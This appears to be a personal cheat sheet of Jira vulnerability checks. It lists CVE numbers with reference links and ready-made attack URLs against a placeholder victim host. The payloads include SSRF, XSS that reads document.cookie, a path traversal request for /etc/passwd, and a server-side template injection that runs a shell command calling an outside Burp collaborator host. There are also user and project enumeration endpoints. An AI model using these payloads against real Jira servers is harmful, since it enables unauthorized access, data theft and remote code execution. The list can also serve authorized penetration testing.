Daily Notes : Day 66
Jira list 

# Jira Scanner

# CVE-2019-8449
https://jira.atlassian.com/browse/JRASERVER-69796
https://victomhost/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true

# CVE-2019-8451:ssrf-response-body
https://jira.atlassian.com/browse/JRASERVER-69793?jql=labels%20%3D%20
https://victomhost/plugins/servlet/gadgets/makeRequest?url=https://victomhost:1337@example.com

# RCE Jira=CVE-2019–11581
https://hackerone.com/reports/706841
/secure/ContactAdministrators!default.jspa

# CVE-2018-20824
https://victomhost/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)

# CVE-2020-14179
REF=https://jira.atlassian.com/browse/JRASERVER-71536
https://victomhost/secure/QueryComponent!Default.jspa

# CVE-2020-14181
Ref=https://jira.atlassian.com/browse/JRASERVER-71560?jql=text%20~%20%22cve-2020-14181%22
https://victomhost/secure/ViewUserHover.jspa
https://victomhost/ViewUserHover.jspa?username=Admin
https://hackerone.com/reports/380354

# CVE-2018-5230
https://jira.atlassian.com/browse/JRASERVER-67289
https://host/issues/?filter=-8

# CVE-2019-3403
https://jira.atlassian.com/browse/JRASERVER-69242
/rest/api/2/user/picker?query=admin

# CVE-2019-8442
https://jira.atlassian.com/browse/JRASERVER-69241
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/rest/api/2/user/picker?query=admin
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

# CVE-2017-9506
https://blog.csdn.net/caiqiiqi/article/details/89017806
/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.nl

# CVE-2019-3402：[Jira]XSS in the labels gadget
/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
ConfigurePortalPages.jspa

# CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter
/plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true

# CVE-2019-3396: [Path Traversal & RCE]
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: JIRA
...
{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}

# CVE-2019-11581: [SSTI]
http://<JIRA>/secure/ContactAdministrators!default.jspa
# Try SSTI payload in subject and/or body:
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp(.)net').waitFor()

# CVE-2020-14178: [Project Key Enum]
http://<JIRA>/browse.<PROJECTKEY>

# CVE-2020-36289: [Username Enumeration]
https://<JIRA>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

# jira-unauthenticated-dashboards:
https://<JIRA>/rest/api/2/dashboard?maxResults=100

# jira-unauth-popular-filters:
https://<JIRA>/secure/ManageFilters.jspa?filterView=popular